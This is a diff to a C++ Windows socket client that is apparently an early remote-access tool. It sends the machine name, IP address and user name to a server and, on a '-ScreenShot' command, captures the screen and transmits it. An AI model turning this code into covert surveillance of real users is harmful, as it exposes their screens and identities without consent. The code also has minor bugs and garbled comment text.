@@ -1,14 +1,125 @@
 #include "client.h"
 
-struct PCDataRequest
-{
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
+    using namespace Gdiplus;
+    UINT  num = 0;
+    UINT  size = 0;
 
+    ImageCodecInfo* pImageCodecInfo = NULL;
+
+    GetImageEncodersSize(&num, &size);
+    if (size == 0)
+        return -1;
+
+    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
+    if (pImageCodecInfo == NULL)
+        return -1;
+
+    GetImageEncoders(num, size, pImageCodecInfo);
+    for (UINT j = 0; j < num; ++j)
+    {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
+        {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j;
+        }
+    }
+    free(pImageCodecInfo);
+    return 0;
+}
+
+void gdiscreen() {
+    using namespace Gdiplus;
+    IStream* istream;
+    HRESULT res = CreateStreamOnHGlobal(NULL, true, &istream);
+    GdiplusStartupInput gdiplusStartupInput;
+    ULONG_PTR gdiplusToken;
+    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+    {
+        HDC scrdc, memdc;
+        HBITMAP membit;
+        scrdc = ::GetDC(0);
+        int Height = GetSystemMetrics(SM_CYSCREEN);
+        int Width = GetSystemMetrics(SM_CXSCREEN);
+        memdc = CreateCompatibleDC(scrdc);
+        membit = CreateCompatibleBitmap(scrdc, Width, Height);
+        HBITMAP hOldBitmap = (HBITMAP)SelectObject(memdc, membit);
+        BitBlt(memdc, 0, 0, Width, Height, scrdc, 0, 0, SRCCOPY);
+
+        Gdiplus::Bitmap bitmap(membit, NULL);
+        CLSID clsid;
+        GetEncoderClsid(L"image/jpeg", &clsid);
+        bitmap.Save(L"C:/Users/Ziglot/screen.jpeg", &clsid, NULL); // To save the jpeg to a file
+        bitmap.Save(istream, &clsid, NULL);
+
+        // Create a bitmap from the stream and save it to make sure the stream has the image
+//		Gdiplus::Bitmap bmp(istream, NULL);
+//		bmp.Save(L"t1est.jpeg", &clsid, NULL);             
+        // END
+
+        //delete &clsid;
+        DeleteObject(memdc);
+        DeleteObject(membit);
+        ::ReleaseDC(0, scrdc);
+    }
+    GdiplusShutdown(gdiplusToken);
+}
+
+
+struct GET_PC_DATA_REQUSET
+{
+    std::string domain;
+    std::string machine;
+    std::string ip;
+    std::string user;
 };
+
+bool GetDataPc(GET_PC_DATA_REQUSET &pc_data)
+{
+    TCHAR  info_buf[32767];
+    DWORD  buf_char_count = 32767;
+
+    // --- Domain ---
+    pc_data.domain = "NONE";
+
+    // --- machine ---
+    if (!GetComputerName(info_buf, &buf_char_count))
+        return false;
+    pc_data.machine = info_buf;
+
+
+    // --- IP ---
+    IP_ADAPTER_INFO AdapterInfo[16];
+    DWORD dwBufLen = sizeof(AdapterInfo);
+
+    DWORD dwStatus = GetAdaptersInfo(AdapterInfo, &dwBufLen);
+    if (dwStatus == ERROR_SUCCESS) {
+        PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
+        while (pAdapterInfo) {
+            std::cout << "IP Address: " << pAdapterInfo->IpAddressList.IpAddress.String << std::endl;
+            pAdapterInfo = pAdapterInfo->Next;
+        }
+    }
+    else {
+        std::cerr << "Failed to get adapter information. Error code: " << dwStatus << std::endl;
+        return 1;
+    }
+    pc_data.ip = AdapterInfo->IpAddressList.IpAddress.String;
+
+    // --- User ---
+    if (!GetUserName(info_buf, &buf_char_count))
+        return false;
+
+    pc_data.user = info_buf;
+
+    return true;
+}
 
 int main()
 {
     const char ip_address[] = "127.0.0.1";
-    const int port = 77777;
+    const int port = 55555;
 
     // Initialize WinSock
     WSAData data{};
@@ -48,12 +159,14 @@ int main()
     // While loop to send and receive data
     char buf[4096];
 
-    // Getting PC Data
-    PCDataRequest pc_data;
+    // --- Getting PC Data ---
+    GET_PC_DATA_REQUSET pc_data;
+    if (!GetDataPc(pc_data))
+        return -1;
 
-    // sending    // CHAR
-    // send(sock, pc.c_str(), pc.size() + 1, 0);
-    std::string message = "Test Connect";
+    // Send
+    // C++ and C++ std::string message = "C " + pc_data.domain + " " + pc_data.machine + " " + pc_data.ip + " " + pc_data.user + "\0";
+    std::string message = pc_data.domain + " " + pc_data.machine + " " + pc_data.ip + " " + pc_data.user;
     send(sock, message.c_str(), message.size() + 1, 0);
 
 
@@ -71,10 +184,25 @@ int main()
 
         std::string command = std::string(buf, 0, bytesReceived);
 
-        // Ñommand processing
+        // ?ommand processing
         if (command == "-Connect")
         {
             std::cout << "[Command from the server]: " << command << std::endl;;
+        }
+        else if (command == "-ScreenShot")
+        {
+            gdiscreen();
+
+            //C:\Users\Ziglot\Pictures
+            std::ifstream infile("C:/Users/Ziglot/screen.jpeg", std::ios::binary);
+            infile.seekg(0, std::ios::end);
+            size_t file_size = infile.tellg();
+            char* data = new char[file_size];
+            infile.seekg(0, std::ios::beg);
+            infile.read(data, file_size);
+            int sendResult = send(sock, data, file_size, 0);
+            if (sendResult == SOCKET_ERROR)
+                std::cout << "Îøèáêà îòïðàâêè äàííûõ" << std::endl;
         }
         else
         {
